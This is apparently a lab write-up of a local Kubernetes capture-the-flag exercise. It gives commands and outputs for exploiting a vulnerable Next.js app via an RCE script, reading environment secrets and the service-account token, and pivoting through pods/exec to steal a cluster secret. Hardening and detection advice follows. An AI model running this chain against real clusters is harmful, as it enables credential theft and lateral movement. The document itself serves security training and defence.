# Local Breach

[Back](../README.md)

- [Local Breach](#local-breach)
  - [Capture Flags](#capture-flags)
    - [Pod Secret](#pod-secret)
    - [SA token](#sa-token)
    - [Cluster Secret (RBAC pivot)](#cluster-secret-rbac-pivot)
  - [Attack Chain Summary](#attack-chain-summary)
  - [Hardening (later phases)](#hardening-later-phases)

---

## Capture Flags

### Pod Secret

- app is accessible at `localhost:8080`

```sh
# test
python scripts/rce.py http://localhost:8080 id
# executable response:
# uid=0(root) gid=0(root) groups=0(root)

# get distro
python scripts/rce.py http://localhost:8080 "cat /etc/os-release"
# executable response:
# PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
# NAME="Debian GNU/Linux"
# VERSION_ID="12"
# VERSION="12 (bookworm)"
# VERSION_CODENAME=bookworm
# ID=debian
# HOME_URL="https://www.debian.org/"
# SUPPORT_URL="https://www.debian.org/support"
# BUG_REPORT_URL="https://bugs.debian.org/"

# get all env secret
python scripts/rce.py http://localhost:8080 "printenv"
# executable response:
# REACT2SHELL_PORT_80_TCP_PROTO=tcp
# KUBERNETES_PORT=tcp://10.96.0.1:443
# KUBERNETES_SERVICE_PORT=443
# NEXT_PRIVATE_WORKER=1
# npm_config_user_agent=npm/10.8.2 node/v20.20.2 linux x64 workspaces/false
# NODE_VERSION=20.20.2
# HOSTNAME=react2shell-8f9d7d998-b2xkl
# YARN_VERSION=1.22.22
# npm_node_execpath=/usr/local/bin/node
# npm_config_noproxy=
# HOME=/root
# PORT=3000
# npm_package_json=/app/package.json
# REACT2SHELL_PORT_80_TCP=tcp://10.96.233.212:80
# NODE_OPTIONS=--max-old-space-size=3892 --enable-source-maps
# npm_config_userconfig=/root/.npmrc
# npm_config_local_prefix=/app
# COLOR=0
# __NEXT_PROCESSED_ENV=true
# NEXT_PRIVATE_TRACE_ID=0e0a678e77e80d60
# REACT2SHELL_SERVICE_PORT_HTTP=80
# NEXT_DEPLOYMENT_ID=
# npm_config_prefix=/usr/local
# npm_config_npm_version=10.8.2
# __NEXT_PRIVATE_ORIGIN=http://localhost:3000
# npm_config_cache=/root/.npm
# __NEXT_PRIVATE_RUNTIME_TYPE=
# KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
# npm_config_node_gyp=/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js
# RUST_MIN_STACK=8388608
# PATH=/app/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# NODE=/usr/local/bin/node
# npm_package_name=react2shell
# KUBERNETES_PORT_443_TCP_PORT=443
# REACT2SHELL_SERVICE_HOST=10.96.233.212
# KUBERNETES_PORT_443_TCP_PROTO=tcp
# npm_lifecycle_script=next dev
# NEXT_RUNTIME=nodejs
# npm_package_version=0.1.0
# npm_lifecycle_event=dev
# REACT2SHELL_PORT=tcp://10.96.233.212:80
# REACT2SHELL_SERVICE_PORT=80
# KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
# KUBERNETES_SERVICE_PORT_HTTPS=443
# npm_config_globalconfig=/usr/local/etc/npmrc
# npm_config_init_module=/root/.npm-init.js
# KUBERNETES_SERVICE_HOST=10.96.0.1
# PWD=/app
# npm_execpath=/usr/local/lib/node_modules/npm/bin/npm-cli.js
# npm_config_global_prefix=/usr/local
# REACT2SHELL_PORT_80_TCP_ADDR=10.96.233.212
# npm_command=run-script
# PWD_SECRET=pod-hello-world
# NODE_ENV=development
# REACT2SHELL_PORT_80_TCP_PORT=80
# INIT_CWD=/app
# EDITOR=vi

# get pod tier flag
python scripts/rce.py http://localhost:8080 "printenv PWD_SECRET"
# pod-hello-world
```

---

### SA token

```sh
# get
python scripts/rce.py http://localhost:8080 "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
# executable response:
# total 0
# lrwxrwxrwx 1 root root 13 Sep 24 22:01 ca.crt -> ..data/ca.crt
# lrwxrwxrwx 1 root root 16 Sep 24 22:01 namespace -> ..data/namespace
# lrwxrwxrwx 1 root root 12 Sep 24 22:01 token -> ..data/token

# get ns
python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
# executable response:
# vuln

# get token
python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# executable response:
# eyJhbGciOiJSUzI1NiIsImtpZCI6InU2WHhSQ0U3eXpiZlpfeWlHWGI0eDN3ck1iRkxGU0wzblVLck5tcEZwRjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jY...

# try request api
python scripts/rce.py http://localhost:8080 "curl -sS https://kubernetes.default.svc"
# curl: (77) error setting certificate file: /etc/ssl/certs/ca-certificates.crt

# request api
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api"
# executable response:
# {
#   "kind": "APIVersions",
#   "versions": [
#     "v1"
#   ],
#   "serverAddressByClientCIDRs": [
#     {
#       "clientCIDR": "0.0.0.0/0",
#       "serverAddress": "172.19.0.4:6443"
#     }
#   ]
# }

python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/vuln/pods"
# executable response: 200 — frontend SA CAN list pods in vuln ns.
# (The full recon/pivot to the cluster flag continues in "Cluster Secret (RBAC pivot)" below.)
```

---

### Cluster Secret (RBAC pivot)

The pod now runs as the `frontend` SA (not `default`). That token **cannot** read
the db-namespace secret directly, but it **can** enumerate pods and exec into them.
The chain: recon with the frontend token → spot the over-privileged
`backend-leftover` pod → pivot into it → use its cluster-wide token to steal the
db secret.

```sh
# [1] recon: frontend token lists pods in its own ns -> spots backend-leftover
python scripts/rce.py http://localhost:8080 'APISERVER=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SA}/token);curl -sS --cacert ${SA}/ca.crt -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/vuln/pods'
# -> pods: react2shell-* (sa: frontend), backend-leftover (sa: backend)

# [2] frontend CANNOT read the db crown jewel directly (confinement holds)
python scripts/rce.py http://localhost:8080 'APISERVER=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SA}/token);curl -sS -o /dev/null -w "%{http_code}\n" --cacert ${SA}/ca.crt -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/db/secrets/secret-cluster'
# -> 403 Forbidden

# [3] pivot: frontend RBAC allows `create pods/exec`, so exec into backend-leftover.
#     NOTE: exec needs a SPDY/websocket upgrade -> plain curl can't do it.
#     A real attacker drops a static kubectl (or a small ws client) into the pod.
#     RBAC permits the exec; verify:
kubectl auth can-i create pods/exec -n vuln --as=system:serviceaccount:vuln:frontend

# [4] from inside backend-leftover, its own (cluster-wide) token reads the db secret
kubectl -n vuln exec backend-leftover -- sh -c 'API=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SA}/token);curl -sS --cacert ${SA}/ca.crt -H "Authorization: Bearer ${TOKEN}" ${API}/api/v1/namespaces/db/secrets/secret-cluster'
# -> 200; .data.pwd (base64) decodes to: cluster-hello-world  (CLUSTER-TIER FLAG)
```

---

## Attack Chain Summary

| # | Stage                             | Enabled by (misconfig)                          | Result            |
| - | --------------------------------- | ----------------------------------------------- | ----------------- |
| 1 | RCE in app pod                    | pinned vulnerable Next.js (CVE-2025-55182)      | root shell in pod |
| 2 | Read pod env secret               | secret injected as `PWD_SECRET` env             | **pod flag**      |
| 3 | Steal SA token                    | token auto-mounted in pod                       | frontend token    |
| 4 | Enumerate pods, spot leftover     | `frontend` Role: get/list/watch pods            | recon             |
| 5 | Pivot into `backend-leftover`     | `frontend` Role: `create pods/exec`             | backend token     |
| 6 | Read db secret                    | `backend` **ClusterRoleBinding** (cluster-wide) | **cluster flag**  |

Every hop is load-bearing — remove any one misconfig and the chain breaks.

## Hardening (later phases)

Re-run the whole chain after each step; record which tier still falls (pod / cluster / cloud).

**Just-enough RBAC** (breaks steps 4–6)

- Replace the `backend` **ClusterRoleBinding** with a **RoleBinding in `db`** scoped
  to `resourceNames: [secret-cluster]` — or delete it. This alone stops the cluster flag.
- Drop `pods/exec` from the `frontend` Role → no pivot.
- Set `automountServiceAccountToken: false` on the app pod/SA → RCE gets no token (kills step 3).
- Audit: `kubectl auth can-i --list --as=system:serviceaccount:vuln:<sa>`, `rakkess`, `kubectl-who-can get secrets -A`.

**Scan for leftover / orphaned pods** (removes step 5's target)

- `kubectl get pods -A -o json | jq '.items[] | select(.metadata.ownerReferences==null) | .metadata.name'`
  — a bare Pod with no controller owner is the classic "leftover".
- Admission policy (**Kyverno / Gatekeeper**): deny pods with no ownerReference, and
  deny binding SAs that hold cluster-wide secret access.
- Cluster scanners: **Kubescape**, **Trivy k8s**, **kube-bench** (in CI + scheduled).

**Detection** (Phase 4 — Grafana + Loki)

- Alert on API-audit `pods/exec` events and on cross-namespace Secret `get`/`list`.
  Both the pivot and the db-secret read are loud in the audit log.

**Defense-in-depth**

- **NetworkPolicy**: deny egress from `vuln` workloads to the API server unless needed → step 4 can't reach the API.
- **Pod Security Standards (restricted)** + seccomp → shrink the RCE blast radius upstream.
